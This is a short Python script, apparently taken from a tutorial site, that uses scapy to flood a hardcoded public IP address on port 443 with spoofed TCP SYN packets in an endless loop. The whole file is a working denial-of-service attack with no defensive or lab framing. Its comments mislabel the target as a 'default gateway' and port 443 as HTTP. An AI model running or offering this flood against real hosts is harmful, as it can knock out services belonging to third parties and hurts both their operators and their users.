#https://www.techgeekbuzz.com/how-to-make-a-syn-flooding-attack-in-python/

from scapy.all import *

#default gateway IP
target_ip ="142.250.207.36"

#http port
target_port = 443
sport = 1000

def synFloodAttack(target_ip, sport, dport):
    s_addr = RandIP()   #random Ip address
    pkt =IP(src= s_addr, dst= target_ip)/ TCP(sport =sport, dport=dport, seq= 1505066, flags="S")
    send(pkt)

while True:
    #type CTRL +C to stop the SYN pkt
    synFloodAttack(target_ip, sport , target_port )
    sport+=1
    if sport>10000:
        sport=1000